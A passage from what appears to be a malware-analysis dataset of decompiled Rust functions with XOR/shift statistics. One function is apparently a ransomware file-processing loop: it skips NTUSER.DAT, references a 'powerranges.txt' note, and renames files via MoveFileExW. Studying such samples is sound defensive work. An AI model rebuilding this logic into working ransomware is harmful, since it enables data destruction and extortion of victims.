(__int64)&off_140069AC0);\n                  sub_1400264A7((__int64 *)&v146, v137, v62, 3ui64);\n                  if ( (_QWORD)v146\n                    || (v63 = *((_QWORD *)&v146 + 1),\n                        sub_1400264A7(\n                          (__int64 *)&v146,\n                          v137,\n                          (__m128i *)\",  JanuaryFebruaryMarchAprilMayJuneJulyAugustSeptemberOctoberNovemberDecember\",\n                          2ui64),\n                        (_QWORD)v146)\n                    || (v157 = v63, v64 = *((_QWORD *)&v146 + 1), sub_1400263A6(&v146, v137, v60), (_QWORD)v146) )\n                  {\n                    v2 = *((_QWORD *)&v146 + 1);\n                    *((_QWORD *)&v143 + 1) = *((_QWORD *)&v146 + 1);\n                    *(_QWORD *)&v143 = 2i64;\n                  }\n                  else\n                  {\n                    v76 = v64;\n                    v77 = *((_QWORD *)&v146 + 1);\n                    sub_1400264A7(\n                      (__int64 *)&v146,\n                      v137,\n                      (__m128i *)\" JanuaryFebruaryMarchAprilMayJuneJulyAugustSeptemberOctoberNovemberDecember\",\n                      1ui64);\n                    if ( !(_QWORD)v146 )\n                    {\n                      v78 = v59 - 1i64;\n                      if ( v78 >= 0xC )\n                        sub_14005DDC0(-1i64, 12i64, (__int64)&off_140069BE8);\n                      v79 = *((_QWORD *)&v146 + 1) + v77 + v157 + v76;\n                      v80 = 16 * v78;\n                      v81 = *(__m128i **)((char *)&off_140069B28 + v80);\n                      sub_1400264E1(\n                        (__int64)v81,\n                        *(unsigned __int64 *)((char *)&off_140069B28 + v80 + 8),\n                        (__int64)&off_140069C00);\n                      sub_1400264A7((__int64 *)&v146, v137, v81, 3ui64);\n                      if ( !(_QWORD)v146 )\n                      {\n                        v82 = v79;\n                        v83 = *((_QWORD *)&v146 + 1);\n                        sub_1400264A7(\n                          (__int64 *)&v146,\n                          v137,\n                          (__m128i *)\" JanuaryFebruaryMarchAprilMayJuneJulyAugustSeptemberOctoberNovemberDecember\",\n                          1ui64);\n                        if ( !(_QWORD)v146 )\n                        {\n                          v157 = *((_QWORD *)&v146 + 1);\n                          sub_14002690A(&v146, v137, v51 >> 9);\n                          if ( !(_QWORD)v146 )\n                          {\n                            v84 = *((_QWORD *)&v146 + 1);\n                            sub_1400264A7(\n                              (__int64 *)&v146,\n                              v137,\n                              (__m128i *)\" JanuaryFebruaryMarchAprilMayJuneJulyAugustSeptemberOctoberNovemberDecember\",\n                              1ui64);\n                            if ( !(_QWORD)v146 )\n                            {\n                              v85 = *((_QWORD *)&v146 + 1);\n                              sub_1400263A6(&v146, v137, BYTE2(v142));\n                              if ( !(_QWORD)v146 )\n                              {\n                                v86 = *((_QWORD *)&v146 + 1);\n                                sub_1400264A7((__int64 *)&v146, v137, (__m128i *)word_14006BF38, 1ui64);\n                                if ( !(_QWORD)v146 )\n                                {\n                                  v164 = *((_QWORD *)&v146 + 1);\n                                  sub_1400263A6(&v146, v137, BYTE1(v142));\n                                  if ( !(_QWORD)v146 )\n                                  {\n                                    v161 = (__m128i *)*((_QWORD *)&v146 + 1);\n                                    sub_1400264A7((__int64 *)&v146, v137, (__m128i *)word_14006BF38, 1ui64);\n                                    if ( !(_QWORD)v146 )\n                                    {\n                                      v163 = *((_QWORD *)&v146 + 1);\n                                      sub_1400263A6(&v146, v137, v142);\n                                      if ( !(_QWORD)v146 )\n                                      {\n                                        v141 = *((_QWORD *)&v146 + 1);\n                                        sub_1400264A7(\n                                          (__int64 *)&v146,\n                                          v137,\n                                          (__m128i *)\" JanuaryFebruaryMarchAprilMayJuneJulyAugustSeptemberOctoberNovemberDecember\",\n                                          1ui64);\n                                        if ( !(_QWORD)v146 )\n                                        {\n                                          v87 = &v161->m128i_i8[v164 + v86 + v85 + v84 + v157 + v163 + v141 + v83 + v82];\n                                          if ( (v151 & 0x80u) != 0i64\n                                            || (v151 & 0x8000) != 0\n                                            || (v151 & 0x80000000) != 0i64 )\n                                          {\n                                            v88 = (__m128i *)\"-offset_secondyear/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\navigate.rs\";\n                                          }\n                                          else\n                                          {\n                                            v88 = (__m128i *)\"+-offset_secondyear/rustc/a28077b28a02b92985b3a3faecf928131\"\n                                                             \"55f1ea1\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\navigate.rs\";\n                                          }\n                                          v95 = &v87[*((_QWORD *)&v146 + 1)];\n                                          sub_1400264A7((__int64 *)&v146, v137, v88, 1ui64);\n                                          if ( !(_QWORD)v146 )\n                                          {\n                                            v96 = *((_QWORD *)&v146 + 1);\n                                            sub_1400263A6(&v146, v137, abs8(v151));\n                                            if ( !(_QWORD)v146 )\n                                            {\n                                              v97 = *((_QWORD *)&v146 + 1);\n                                              sub_1400263A6(&v146, v137, abs8(SBYTE1(v151)));\n                                              if ( !(_QWORD)v146 )\n                                              {\n                                                *((_QWORD *)&v143 + 1) = &v95[v96 + v97 + *((_QWORD *)&v146 + 1)];\nLABEL_132:\n                                                *(_QWORD *)&v143 = 3i64;\n                                                v22 = v135;\n                                                v23 = (_QWORD *)v137;\n                                                v4 = v156;\n                                                goto LABEL_133;\n                                              }\n                                            }\n                                          }\n                                        }\n                                      }\n                                    }\n                                  }\n                                }\n                              }\n                            }\n                          }\n                        }\n                      }\n                    }\n                    v2 = *((_QWORD *)&v146 + 1);\n                    *((_QWORD *)&v143 + 1) = *((_QWORD *)&v146 + 1);\n                  }\n                  v19 = v138;\n                  v22 = v135;\nLABEL_221:\n                  sub_14000DEB6(v19, v22);\n                  return sub_140029C3D(v2);\n                }\n                v93 = 13i64;\n                v94 = \"offset_secondyear/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\navigate.rs\";\n              }\n              *(_QWORD *)&v143 = 1i64;\n              *((_QWORD *)&v143 + 1) = v94;\n              v144 = v93;\n              goto LABEL_96;\n            }\n          }\n          v143 = 0i64;\n          goto LABEL_96;\n        }\nLABEL_27:\n        v151 = v33;\n        v37 += 60;\n        v38 = ~(_BYTE)v31;\n        goto LABEL_28;\n      }\n    }\n    LOBYTE(v33) = v33 + 60;\n    v37 = ~(_BYTE)v34;\n    goto LABEL_27;\n  }\n  v9 = v7;\n  v10 = 24 * v8;\n  v2 = 0i64;\n  while ( v10 )\n  {\n    v11 = *(const void **)v9;\n    if ( !*(_QWORD *)v9 )\n      v11 = *(const void **)(v9 + 8);\n    v12 = *(_QWORD *)(v9 + 16);\n    v9 += 24i64;\n    v10 -= 24i64;\n    if ( sub_14004AA9F(v5, v6, v11, v12) )\n      goto LABEL_9;\n  }\n  return sub_140029C3D(v2);\n}\n// 140087050: invalid function type '?' has been ignored\n// 140027FE4: variable 'v8' is possibly undefined\n// 14002802E: variable 'v14' is possibly undefined\n// 14002809B: variable 'v21' is possibly undefined\n// 1400283C4: variable 'v42' is possibly undefined\n// 1400283DE: variable 'v48' is possibly undefined\n// 1400283E5: variable 'v49' is possibly undefined\n// 140028488: variable 'v55' is possibly undefined\n// 14002848F: variable 'v56' is possibly undefined\n// 1400284C2: variable 'v58' is possibly undefined\n// 140028653: variable 'v68' is possibly undefined\n// 1400293E9: variable 'v25' is possibly undefined\n// 1400293E9: variable 'v26' is possibly undefined\n// 1400293E9: variable 'v20' is possibly undefined\n// 140029A56: variable 'v122' is possibly undefined\n// 140029A78: variable 'v126' is possibly undefined\n// 140029AA9: variable 'v128' is possibly undefined\n// 140029B34: variable 'v130' is possibly undefined\n// 140002560: using guessed type void __fastcall __noreturn sub_140002560();\n// 140009C96: using guessed type __int64 __fastcall sub_140009C96();\n// 1400693B8: using guessed type void *off_1400693B8;\n// 1400693D0: using guessed type void *off_1400693D0;\n// 1400695B8: using guessed type char *off_1400695B8;\n// 140069638: using guessed type char *off_140069638;\n// 140069650: using guessed type void *off_140069650;\n// 140069668: using guessed type void *off_140069668;\n// 140069688: using guessed type void **off_140069688;\n// 1400696B0: using guessed type void *off_1400696B0;\n// 1400696F0: using guessed type void *off_1400696F0;\n// 140069710: using guessed type void **off_140069710;\n// 1400697D0: using guessed type char *off_1400697D0;\n// 140069808: using guessed type void *off_140069808;\n// 1400699E0: using guessed type void *off_1400699E0;\n// 140069AC0: using guessed type char *off_140069AC0;\n// 140069B28: using guessed type void *off_140069B28;\n// 140069BE8: using guessed type char *off_140069BE8;\n// 140069C00: using guessed type char *off_140069C00;\n// 14006BE98: using guessed type void **off_14006BE98;\n// 14006BF38: using guessed type unsigned __int16 word_14006BF38[4];\n// 14006DE78: using guessed type void *off_14006DE78;\n// 14006DFA8: using guessed type void *off_14006DFA8;\n// 14006DFE8: using guessed type void *off_14006DFE8;\n// 14006E000: using guessed type void *off_14006E000;\n// 140087050: using guessed type __int64 (__fastcall *off_140087050)(_QWORD);\n\n"
    },
    {
        "Function": "sub_14000EEA9",
        "Total XOR and shift operations": 13,
        "XOR operations": 1,
        "Shift operations": 12,
        "Operation percentage": "0.92%",
        "Function Body": "\nint __fastcall sub_14000EEA9(__int64 a1, unsigned __int64 a2)\n{\n  __m128i v2; // xmm14\n  __m128i v3; // xmm15\n  __int64 v4; // rsi\n  __m128i si128; // xmm7\n  __m128i v6; // xmm8\n  __int128 v7; // xmm10\n  __int64 v8; // rsi\n  __int64 v9; // rax\n  __int64 v10; // rdi\n  char v11; // dl\n  _QWORD *v12; // rax\n  char v13; // dl\n  __int64 v14; // r9\n  __int64 v15; // r8\n  __int64 v16; // rcx\n  unsigned __int64 v17; // r11\n  __int64 v18; // r8\n  char v19; // r9\n  __int64 v20; // rcx\n  __int128 v21; // xmm0\n  void *v22; // rsi\n  LPCWSTR v23; // rdi\n  __int64 v24; // rbx\n  __int8 v25; // r12\n  __int64 v26; // rdx\n  __int64 v27; // rcx\n  __int64 v28; // r8\n  char *v29; // rsi\n  char *v30; // rax\n  unsigned __int64 v31; // rdx\n  __int64 v32; // rcx\n  __int64 v33; // rax\n  void **v34; // rdx\n  WCHAR *v35; // r12\n  __m128i *v36; // rsi\n  unsigned __int64 v37; // rdi\n  WCHAR *v38; // rbx\n  void *v39; // rsi\n  void *v40; // rsi\n  char *v41; // rdi\n  __int64 v42; // rbx\n  unsigned __int64 v43; // rbx\n  void *v44; // rsi\n  __int64 v45; // rax\n  WCHAR *v46; // rdx\n  LPCWSTR v47; // rdi\n  char *v48; // rsi\n  WCHAR *v49; // rdx\n  __int64 i; // rdi\n  int v51; // eax\n  char v52; // dl\n  char v53; // bl\n  int v54; // eax\n  char v55; // dl\n  __m128i *v56; // rcx\n  unsigned __int64 v57; // rsi\n  __int64 v58; // rdx\n  __m128i *v59; // rdi\n  BOOLEAN v60; // al\n  __m128i v61; // xmm1\n  unsigned __int64 j; // rsi\n  __int64 k; // rax\n  char v64; // cl\n  __m128i v65; // xmm1\n  __m128i v66; // xmm2\n  unsigned __int64 m; // rsi\n  int v68; // ebx\n  bool v69; // cf\n  unsigned __int64 v70; // rsi\n  unsigned __int64 v71; // rax\n  unsigned __int64 v72; // rdx\n  unsigned __int64 v73; // rcx\n  unsigned __int64 n; // rax\n  int v75; // ecx\n  __int64 v76; // rax\n  __int64 ii; // rsi\n  unsigned __int8 v78; // al\n  unsigned __int8 v79; // al\n  char *v80; // rax\n  __int64 v81; // rdx\n  __int64 v82; // rcx\n  __m128i *v83; // rax\n  __int64 v84; // rdx\n  __m128i v85; // xmm14\n  const WCHAR *v86; // rdx\n  __m128i v87; // xmm7\n  float v88; // xmm0_4\n  WCHAR *v89; // r12\n  __m128i v90; // rax\n  void (**v91)(void); // rax\n  __int128 v92; // xmm12\n  float v93; // xmm10_4\n  unsigned __int64 v94; // rdi\n  unsigned __int64 v95; // rsi\n  __int64 v96; // rsi\n  char *v97; // rdi\n  char *v98; // rsi\n  __int64 v99; // rax\n  unsigned __int64 v100; // rsi\n  LARGE_INTEGER v101; // rbx\n  LARGE_INTEGER v102; // r9\n  __int64 v103; // rax\n  __int64 v104; // rdx\n  __int64 v105; // rcx\n  __int64 v107; // rax\n  __int64 v108; // rdx\n  void *v109; // rdi\n  char **v110; // rax\n  LPCWSTR v111; // rdx\n  char *v112; // rax\n  __int64 jj; // rcx\n  __int64 v114; // rsi\n  void *v115; // rsi\n  char **v116; // rdi\n  __int64 v117; // rbx\n  __int64 v118; // rsi\n  __int64 v119; // r12\n  unsigned __int64 v120; // rcx\n  __int64 v121; // rax\n  __int64 v122; // rdx\n  LPCWSTR v123; // rsi\n  __int64 v124; // r12\n  __int64 v125; // rdi\n  __int64 v126; // rdx\n  LPCWSTR v127; // rsi\n  void *v128; // rdi\n  __int64 v129; // rbx\n  void *v130; // rsi\n  LPCWSTR v131; // rdi\n  char **v132; // rax\n  __int64 v133; // rdx\n  WCHAR *v135; // rax\n  void **v136; // r8\n  LPCWSTR v137; // rcx\n  __int64 v138[5]; // [rsp+118h] [rbp-50h] BYREF\n  _QWORD v139[5]; // [rsp+140h] [rbp-28h] BYREF\n  _QWORD v140[5]; // [rsp+168h] [rbp+0h] BYREF\n  unsigned __int64 v141[5]; // [rsp+190h] [rbp+28h] BYREF\n  unsigned __int64 v142[5]; // [rsp+1B8h] [rbp+50h] BYREF\n  unsigned __int64 v143[5]; // [rsp+1E0h] [rbp+78h] BYREF\n  unsigned __int64 v144[5]; // [rsp+208h] [rbp+A0h] BYREF\n  unsigned __int64 v145[5]; // [rsp+230h] [rbp+C8h] BYREF\n  unsigned __int64 v146[5]; // [rsp+258h] [rbp+F0h] BYREF\n  unsigned __int64 v147[5]; // [rsp+280h] [rbp+118h] BYREF\n  __m128i v148; // [rsp+2A8h] [rbp+140h] BYREF\n  __m128i v149; // [rsp+2B8h] [rbp+150h] BYREF\n  __int128 v150[2]; // [rsp+2C8h] [rbp+160h]\n  __m128i v151; // [rsp+2E8h] [rbp+180h] BYREF\n  __m128i v152; // [rsp+2F8h] [rbp+190h]\n  LARGE_INTEGER v153[5]; // [rsp+310h] [rbp+1A8h] BYREF\n  __int128 v154[3]; // [rsp+338h] [rbp+1D0h] BYREF\n  __m128i v155; // [rsp+368h] [rbp+200h]\n  __m128i v156[2]; // [rsp+378h] [rbp+210h] BYREF\n  __m128i v157; // [rsp+398h] [rbp+230h] BYREF\n  __m128i v158; // [rsp+3A8h] [rbp+240h] BYREF\n  __int128 v159[8]; // [rsp+3B8h] [rbp+250h] BYREF\n  __int64 v160[2]; // [rsp+438h] [rbp+2D0h] BYREF\n  __int64 v161[2]; // [rsp+448h] [rbp+2E0h] BYREF\n  __m128i v162; // [rsp+458h] [rbp+2F0h] BYREF\n  __m128i v163; // [rsp+468h] [rbp+300h]\n  __m128i v164; // [rsp+478h] [rbp+310h]\n  __m128i v165; // [rsp+488h] [rbp+320h]\n  __int64 v166; // [rsp+498h] [rbp+330h]\n  __int64 v167; // [rsp+4A0h] [rbp+338h]\n  __int64 v168; // [rsp+4A8h] [rbp+340h] BYREF\n  unsigned __int64 v169; // [rsp+4B0h] [rbp+348h]\n  __int128 v170; // [rsp+4B8h] [rbp+350h]\n  unsigned __int64 v171; // [rsp+4C8h] [rbp+360h]\n  __int64 v172; // [rsp+4D0h] [rbp+368h] BYREF\n  unsigned __int64 v173; // [rsp+4D8h] [rbp+370h]\n  LPCWSTR lpNewFileName[7]; // [rsp+4E0h] [rbp+378h] BYREF\n  __int128 v175; // [rsp+518h] [rbp+3B0h]\n  __int64 v176; // [rsp+528h] [rbp+3C0h]\n  _QWORD v177[10]; // [rsp+530h] [rbp+3C8h] BYREF\n  unsigned __int64 v178; // [rsp+580h] [rbp+418h] BYREF\n  unsigned __int64 v179; // [rsp+588h] [rbp+420h]\n  __int128 v180; // [rsp+598h] [rbp+430h] BYREF\n  unsigned __int64 v181; // [rsp+5A8h] [rbp+440h]\n  char v182; // [rsp+5B0h] [rbp+448h]\n  _DWORD v183[3]; // [rsp+5B1h] [rbp+449h]\n  char *v184; // [rsp+5C0h] [rbp+458h]\n  __int128 *v185; // [rsp+5C8h] [rbp+460h]\n  __int64 v186; // [rsp+5D0h] [rbp+468h]\n  __m128i RandomBuffer[5]; // [rsp+5D8h] [rbp+470h] BYREF\n  unsigned __int64 v188[5]; // [rsp+628h] [rbp+4C0h] BYREF\n  unsigned __int64 v189[17]; // [rsp+650h] [rbp+4E8h] BYREF\n  __m128i v190; // [rsp+6D8h] [rbp+570h] BYREF\n  _BYTE v191[80]; // [rsp+6E8h] [rbp+580h] BYREF\n  _BYTE v192[72]; // [rsp+738h] [rbp+5D0h] BYREF\n  __int64 v193; // [rsp+780h] [rbp+618h]\n  __m128i NewFilePointer[16]; // [rsp+788h] [rbp+620h] BYREF\n  void *v195[2]; // [rsp+890h] [rbp+728h] BYREF\n  unsigned __int64 v196; // [rsp+8A0h] [rbp+738h]\n  unsigned __int64 v197; // [rsp+8B8h] [rbp+750h] BYREF\n  char *v198; // [rsp+8C0h] [rbp+758h]\n  LPCWSTR lpExistingFileName; // [rsp+8C8h] [rbp+760h]\n  __int64 v200; // [rsp+8D0h] [rbp+768h]\n  WCHAR *v201; // [rsp+8D8h] [rbp+770h]\n  __int64 v202; // [rsp+8E0h] [rbp+778h]\n\n  v202 = -2i64;\n  v4 = a1;\n  v172 = a1;\n  v179 = a2;\n  v173 = a2;\n  si128 = _mm_load_si128((const __m128i *)&xmmword_140060600);\n  v6 = _mm_load_si128((const __m128i *)&xmmword_140060610);\n  v7 = 0x3C23D70Au;\n  while ( 1 )\n  {\n    v8 = v4 + 16;\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        sub_1400131CF((__int64)NewFilePointer, v8);\n        v9 = sub_14000DE6E((__int64)NewFilePointer, (__int64)&off_1400677F8);\n        v10 = *(_QWORD *)(v9 + 40);\n        sub_14000DEB6(v9, v11);\n        if ( v10 )\n          break;\n        Sleep(0x3E8u);\n        if ( (unsigned __int64)qword_140087B48 >= 5 )\n        {\n          NewFilePointer[0].m128i_i64[0] = (__int64)&off_140067928;\n          NewFilePointer[0].m128i_i64[1] = 1i64;\n          NewFilePointer[1].m128i_i64[0] = (__int64)&off_14006E000;\n          *(__m128i *)((char *)&NewFilePointer[1] + 8) = 0i64;\n          sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 158);\n        }\n      }\n      sub_1400131CF((__int64)NewFilePointer, v8);\n      v12 = (_QWORD *)sub_14000DE6E((__int64)NewFilePointer, (__int64)&off_140067810);\n      v14 = v12[5];\n      if ( v14 )\n      {\n        v15 = v12[4];\n        v16 = v12[2];\n        v17 = v12[3];\n        if ( v15 + 1 < v17 )\n          v17 = 0i64;\n        v12[4] = v15 - v17 + 1;\n        v12[5] = v14 - 1;\n        v18 = 32 * v15;\n        v19 = *(_BYTE *)(v16 + v18 + 24);\n        *(__int32 *)((char *)RandomBuffer[0].m128i_i32 + 3) = *(_DWORD *)(v16 + v18 + 28);\n        RandomBuffer[0].m128i_i32[0] = *(_DWORD *)(v16 + v18 + 25);\n        if ( v19 != 2 )\n          break;\n      }\n      sub_14000DEB6((__int64)v12, v13);\n    }\n    v20 = v18 + v16;\n    v21 = *(_OWORD *)v20;\n    v181 = *(_QWORD *)(v20 + 16);\n    v180 = v21;\n    v182 = v19;\n    *(_DWORD *)((char *)v183 + 3) = *(__int32 *)((char *)RandomBuffer[0].m128i_i32 + 3);\n    v183[0] = RandomBuffer[0].m128i_i32[0];\n    sub_14000DEB6((__int64)v12, v13);\n    sub_14004A290((__int64)&v162, (const __m128i *)\"EMPTYProcessing file , thread id: \", 5i64);\n    sub_140039FB0((__int64)lpNewFileName, (unsigned __int8 *)v180, v181);\n    v22 = (void *)v162.m128i_i64[0];\n    sub_140039FB0((__int64)v191, (unsigned __int8 *)v162.m128i_i64[0], v163.m128i_u64[0]);\n    v23 = lpNewFileName[1];\n    v24 = *(_QWORD *)&v191[8];\n    if ( lpNewFileName[1] == *(LPCWSTR *)&v191[8] )\n    {\n      v25 = (__int8)lpNewFileName[2];\n      if ( (_BYTE)v175 == v191[56]\n        && BYTE1(v175) == 2\n        && v191[57] == 2\n        && LOBYTE(lpNewFileName[2]) < 3u == v191[16] < 3u\n        && sub_1400249FB(lpNewFileName[0], (size_t)lpNewFileName[1], *(const void **)v191, (__int64)lpNewFileName[1]) )\n      {\n        break;\n      }\n    }\n    else\n    {\n      v25 = (__int8)lpNewFileName[2];\n    }\n    if ( v25 != 6 )\n    {\n      *(LPCWSTR *)((char *)&NewFilePointer[1].m128i_i64[1] + 7) = lpNewFileName[6];\n      NewFilePointer[1] = *(__m128i *)((char *)&lpNewFileName[4] + 1);\n      NewFilePointer[0] = *(__m128i *)((char *)&lpNewFileName[2] + 1);\n    }\n    RandomBuffer[3].m128i_i64[0] = *(__int64 *)((char *)&NewFilePointer[1].m128i_i64[1] + 7);\n    *(__m128i *)((char *)&RandomBuffer[2] + 1) = NewFilePointer[1];\n    *(__m128i *)((char *)&RandomBuffer[1] + 1) = NewFilePointer[0];\n    RandomBuffer[0].m128i_i64[0] = (__int64)lpNewFileName[0];\n    RandomBuffer[0].m128i_i64[1] = (__int64)v23;\n    RandomBuffer[1].m128i_i8[0] = v25;\n    RandomBuffer[3].m128i_i16[4] = v175;\n    RandomBuffer[3].m128i_i8[10] = BYTE2(v175);\n    if ( v191[16] != 6 )\n    {\n      *(_QWORD *)((char *)&v159[1] + 15) = *(_QWORD *)&v191[48];\n      v159[1] = *(_OWORD *)&v191[33];\n      v159[0] = *(_OWORD *)&v191[17];\n    }\n    NewFilePointer[3].m128i_i64[0] = *(_QWORD *)((char *)&v159[1] + 15);\n    *(__m128i *)((char *)&NewFilePointer[2] + 1) = _mm_load_si128((const __m128i *)&v159[1]);\n    *(__int128 *)((char *)&NewFilePointer[1] + 1) = v159[0];\n    NewFilePointer[0].m128i_i64[0] = *(_QWORD *)v191;\n    NewFilePointer[0].m128i_i64[1] = v24;\n    NewFilePointer[1].m128i_i8[0] = v191[16];\n    NewFilePointer[3].m128i_i16[4] = *(_WORD *)&v191[56];\n    NewFilePointer[3].m128i_i8[10] = v191[58];\n    if ( sub_140017515((__int128 *)RandomBuffer[0].m128i_i8, (__int128 *)NewFilePointer[0].m128i_i8) )\n      break;\n    sub_14004AA27(v22, v162.m128i_i64[1]);\n    if ( (unsigned __int64)qword_140087B48 > 4 )\n    {\n      sub_14000116A((__int64)RandomBuffer, (__int64)&v180);\n      v29 = sub_14002E5D0(v27, v26, v28);\n      lpNewFileName[0] = (LPCWSTR)v29;\n      *(_QWORD *)&v159[0] = *((_QWORD *)v29 + 2);\n      *(_QWORD *)v191 = RandomBuffer;\n      *(_QWORD *)&v191[8] = sub_140033450;\n      NewFilePointer[0].m128i_i64[0] = (__int64)&off_140067850;\n      NewFilePointer[0].m128i_i64[1] = 2i64;\n      NewFilePointer[2].m128i_i64[0] = 0i64;\n      *(_QWORD *)&v191[16] = v159;\n      *(_QWORD *)&v191[24] = sub_14002E550;\n      NewFilePointer[1].m128i_i64[0] = (__int64)v191;\n      NewFilePointer[1].m128i_i64[1] = 2i64;\n      sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 138);\n      if ( !_InterlockedDecrement64((volatile signed __int64 *)v29) )\n        sub_14004BC50((__int64 *)lpNewFileName);\n      sub_14004AA27((void *)RandomBuffer[0].m128i_i64[0], RandomBuffer[0].m128i_i64[1]);\n      v179 = v173;\n    }\n    sub_14000116A((__int64)v195, (__int64)&v180);\n    v178 = v179;\n    v161[0] = (__int64)\"powerrangesNTUSER.DATntuser.dat.LOG1ntuser.dat.LOG2powerranges.txtAdd \";\n    v161[1] = 11i64;\n    v30 = sub_140039C60((unsigned __int8 *)v195[0], v196);\n    if ( v30 )\n    {\n      sub_140003C00((__int64)NewFilePointer, (__int64)v30, v31);\n      if ( NewFilePointer[0].m128i_i64[0] )\n        v33 = 0i64;\n      else\n        v33 = NewFilePointer[0].m128i_i64[1];\n      v32 = NewFilePointer[1].m128i_i64[0];\n    }\n    else\n    {\n      v33 = 0i64;\n    }\n    v34 = (void **)v33;\n    if ( !v33 )\n    {\n      v34 = &off_14006E000;\n      v32 = 0i64;\n    }\n    v160[0] = (__int64)v34;\n    v160[1] = v32;\n    sub_1400372C0((__int64)NewFilePointer, (char *)v195[0], v196);\n    if ( NewFilePointer[0].m128i_i32[0] == 2 )\n    {\n      RandomBuffer[0].m128i_i64[1] = NewFilePointer[0].m128i_i64[1];\n      RandomBuffer[0].m128i_i64[0] = 2i64;\nLABEL_39:\n      sub_140001031(&RandomBuffer[0].m128i_i64[1]);\n      v35 = 0i64;\n      goto LABEL_217;\n    }\n    qmemcpy(RandomBuffer, NewFilePointer, 0x48ui64);\n    if ( RandomBuffer[0].m128i_i64[0] == 2 )\n      goto LABEL_39;\n    sub_140039E00((__int128 *)v191, (__m128i *)v195[0], v196, (const __m128i *)&off_14006E000, 0i64);\n    v36 = *(__m128i **)v191;\n    v37 = *(_QWORD *)&v191[16];\n    RandomBuffer[0].m128i_i64[0] = (__int64)v160;\n    RandomBuffer[0].m128i_i64[1] = (__int64)sub_1400249C5;\n    NewFilePointer[0].m128i_i64[0] = (__int64)&off_140060710;\n    NewFilePointer[0].m128i_i64[1] = 2i64;\n    NewFilePointer[2].m128i_i64[0] = 0i64;\n    RandomBuffer[1].m128i_i64[0] = (__int64)v161;\n    RandomBuffer[1].m128i_i64[1] = (__int64)sub_1400249C5;\n    NewFilePointer[1].m128i_i64[0] = (__int64)RandomBuffer;\n    NewFilePointer[1].m128i_i64[1] = 2i64;\n    sub_140001EF0((__int64)lpNewFileName, NewFilePointer[0].m128i_i64);\n    v38 = (WCHAR *)lpNewFileName[0];\n    sub_140039E00(\n      (__int128 *)NewFilePointer[0].m128i_i8,\n      v36,\n      v37,\n      (const __m128i *)lpNewFileName[0],\n      (unsigned __int64)lpNewFileName[2]);\n    sub_14004AA27(v38, (__int64)lpNewFileName[1]);\n    sub_14004AA27(v36, *(__int64 *)&v191[8]);\n    v39 = (void *)NewFilePointer[0].m128i_i64[0];\n    sub_140039CF0(\n      v154,\n      (const __m128i *)v195[0],\n      v196,\n      (unsigned __int8 *)NewFilePointer[0].m128i_i64[0],\n      NewFilePointer[1].m128i_i64[0]);\n    sub_14004AA27(v39, NewFilePointer[0].m128i_i64[1]);\n    sub_14000116A((__int64)RandomBuffer, (__int64)v195);\n    sub_14000116A((__int64)NewFilePointer, (__int64)v154);\n    v40 = (void *)RandomBuffer[0].m128i_i64[0];\n    v41 = (char *)NewFilePointer[0].m128i_i64[0];\n    v42 = NewFilePointer[1].m128i_i64[0];\n    sub_14002DD60((__int64)v191, (char *)RandomBuffer[0].m128i_i64[0], RandomBuffer[1].m128i_i64[0]);\n    if ( *(_QWORD *)v191 )\n    {\n      sub_140035510((__int64)lpNewFileName, (__int64)v191, 1);\n      lpExistingFileName = lpNewFileName[0];\n      if ( lpNewFileName[0] )\n      {\n        v201 = (WCHAR *)lpNewFileName[1];\n        sub_14002DD60((__int64)v191, v41, v42);\n        v35 = *(WCHAR **)&v191[8];\n        if ( !*(_QWORD *)v191 )\n          goto LABEL_55;\n        sub_140035510((__int64)lpNewFileName, (__int64)v191, 1);\n        v35 = (WCHAR *)lpNewFileName[1];\n        if ( !lpNewFileName[0] )\n          goto LABEL_55;\n        v200 = (__int64)lpNewFileName[0];\n        if ( !MoveFileExW(lpExistingFileName, lpNewFileName[0], 1u) )\n        {\n          v43 = ((unsigned __int64)GetLastError() << 32) | 2;\n          if ( v35 )\n            sub_1400015D0((void *)v200, 2ui64);\n          v35 = (WCHAR *)v43;\nLABEL_55:\n          if ( v201 )\n            sub_1400015D0((void *)lpExistingFileName, 2ui64);\n          goto LABEL_57;\n        }\n        if ( v35 )\n          sub_1400015D0((void *)v200, 2ui64);\n        if ( v201 )\n          sub_1400015D0((void *)lpExistingFileName, 2ui64);\n        v35 = 0i64;\n      }\n      else\n      {\n        v35 = (WCHAR *)lpNewFileName[1];\n      }\n    }\n    else\n    {\n      v35 = *(WCHAR **)&v191[8];\n    }\nLABEL_57:\n    sub_14004AA27(v41, NewFilePointer[0].m128i_i64[1]);\n    sub_14004AA27(v40, RandomBuffer[0].m128i_i64[1]);\n    if ( v35 )\n      goto LABEL_216;\n    *(__int32 *)((char *)NewFilePointer[2].m128i_i32 + 2) = 0;\n    NewFilePointer[0].m128i_i32[0] = 0;\n    *(__m128i *)((char *)NewFilePointer + 8) = 0i64;\n    NewFilePointer[1].m128i_i64[1] = 7i64;\n    NewFilePointer[2].m128i_i16[0] = 257;\n    sub_14000116A((__int64)RandomBuffer, (__int64)v154);\n    v44 = (void *)RandomBuffer[0].m128i_i64[0];\n    v45 = sub_140034B90((char *)RandomBuffer[0].m128i_i64[0], RandomBuffer[1].m128i_i64[0], (__int64)NewFilePointer);\n    v35 = v46;\n    if ( v45 )\n    {\n      sub_14004AA27(v44, RandomBuffer[0].m128i_i64[1]);\n      goto LABEL_216;\n    }\n    sub_14004AA27(v44, RandomBuffer[0].m128i_i64[1]);\n    sub_140034DF0((__int64)NewFilePointer, v35);\n    if ( NewFilePointer[0].m128i_i32[0] == 2 )\n    {\n      v47 = (LPCWSTR)NewFilePointer[0].m128i_i64[1];\n      goto LABEL_215;\n    }\n    v197 = NewFilePointer[3].m128i_u64[1];\n    if ( (unsigned __int64)qword_140087B48 > 4 )\n    {\n      sub_14000116A((__int64)RandomBuffer, (__int64)v195);\n      *(_QWORD *)v191 = RandomBuffer;\n      *(_QWORD *)&v191[8] = sub_140033450;\n      NewFilePointer[0].m128i_i64[0] = (__int64)&off_140060740;\n      NewFilePointer[0].m128i_i64[1] = 2i64;\n      NewFilePointer[2].m128i_i64[0] = 0i64;\n      *(_QWORD *)&v191[16] = &v197;\n      *(_QWORD *)&v191[24] = sub_140001000;\n      